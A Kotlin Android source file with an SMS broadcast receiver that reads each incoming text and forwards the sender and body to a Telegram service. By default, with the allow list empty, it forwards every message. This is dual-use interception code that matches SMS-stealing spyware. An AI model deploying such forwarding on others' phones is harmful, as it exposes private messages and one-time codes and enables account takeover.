package com.example.smseye

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            val sender = messages[0].displayOriginatingAddress ?: "Unknown"
            val fullBody = messages.joinToString("") { it.messageBody ?: "" }

            val prefs = context.getSharedPreferences("Settings", Context.MODE_PRIVATE)
            val allowedString = prefs.getString("allowed_senders", "") ?: ""
            val allowedList = allowedString.split(",").map { it.trim().lowercase() }

            // যদি ফিল্টার খালি থাকে তবে সব যাবে, নাহলে শুধু লিস্টের গুলো যাবে
            if (allowedString.isEmpty() || allowedList.contains(sender.lowercase())) {
                TelegramService.forwardSms(context, sender, fullBody)
            }
        }
    }
}
